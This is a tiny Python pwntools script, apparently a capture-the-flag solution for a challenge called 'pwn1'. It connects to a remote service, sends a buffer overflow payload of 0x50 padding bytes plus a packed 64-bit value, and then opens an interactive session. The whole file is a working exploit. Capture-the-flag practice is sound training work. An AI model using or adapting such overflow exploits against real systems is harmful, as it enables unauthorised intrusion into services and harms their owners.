from pwn import *

#p = process('./pwn1')
p = remote('shadowchat.top', 8302)

payload = b'a' * 0x50 + p64(7355608)
p.sendline(payload)

p.interactive()

